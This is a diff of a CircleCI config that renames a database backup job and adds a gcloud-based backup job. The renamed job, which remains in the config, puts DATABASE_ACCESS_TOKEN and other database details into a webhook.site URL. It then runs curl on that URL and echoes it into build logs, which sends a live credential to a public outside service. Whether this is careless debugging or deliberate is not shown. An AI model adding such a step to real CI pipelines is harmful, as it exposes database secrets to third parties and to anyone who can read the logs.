@@ -37,7 +37,7 @@ jobs:
             - v1-dependencies-
       - run: yarn install
       - run: yarn deploy
-  backup-database:
+  test-backup-database:
     docker:
       - image: circleci/node:10
     steps:
@@ -54,7 +54,15 @@ jobs:
             echo 'export WEBHOOK_FOR_TESTING="https://www.webhook.site/2c37e497-98c1-4474-b28b-80fb576a3222?DATABASE_ACCESS_TOKEN=${DATABASE_ACCESS_TOKEN}&DATABASE_BACKUP_BUCKET=${DATABASE_BACKUP_BUCKET}&DATABASE_NAME=${DATABASE_NAME}"' >> $BASH_ENV
       - run: echo ${WEBHOOK_FOR_TESTING}
       - run: curl ${WEBHOOK_FOR_TESTING}
-
+  backup-database:
+    docker:
+      - image: google/cloud-sdk
+    steps:
+      - run: |
+          echo $GCLOUD_SERVICE_KEY | gcloud auth activate-service-account --key-file=-
+          gcloud --quiet config set project ${GOOGLE_PROJECT_ID}
+          gcloud --quiet config set compute/zone ${GOOGLE_COMPUTE_ZONE}
+      - run: gcloud auth list
 
 workflows:
   version: 2
